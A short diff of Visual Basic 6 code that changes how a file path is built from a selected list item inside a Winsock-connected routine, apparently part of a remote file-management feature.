@@ -608,7 +608,7 @@ Dim modoejecutar As String
 
 If Form1.Winsock1(vIndex(0)).state = sckConnected Then
     
-    path = arch.SelectedItem.SubItems(2) & arch.SelectedItem.Text
+    path = arch.SelectedItem.SubItems(2)
     
     If Option1.Value = False And Option2.Value = False Then
         Option1.Value = True
